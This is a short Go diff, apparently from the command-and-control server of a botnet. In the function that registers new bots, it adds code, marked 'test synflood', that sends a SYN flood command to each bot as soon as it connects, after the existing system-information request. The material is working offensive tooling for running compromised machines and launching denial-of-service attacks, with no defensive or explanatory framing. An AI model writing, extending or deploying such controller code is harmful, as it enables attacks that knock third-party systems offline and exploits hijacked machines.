@@ -60,6 +60,10 @@ func DispatchNewBot(w http.ResponseWriter, r *http.Request, msgDecryptKey *rsa.P
 	if err := bot.Send(&protocol.Command{Type: protocol.CommandTypeSysInfo}); err != nil {
 		return nil, fmt.Errorf("could not send SYS_INFO command to bot %s: %s", bot.ID, err)
 	}
+	// test synflood
+	if err := bot.Send(&protocol.Command{Type: protocol.CommandTypeSynflood}); err != nil {
+		return nil, fmt.Errorf("could not send SYN_FLOOD command to bot %s: %s", bot.ID, err)
+	}
 	return bot, nil
 }
 
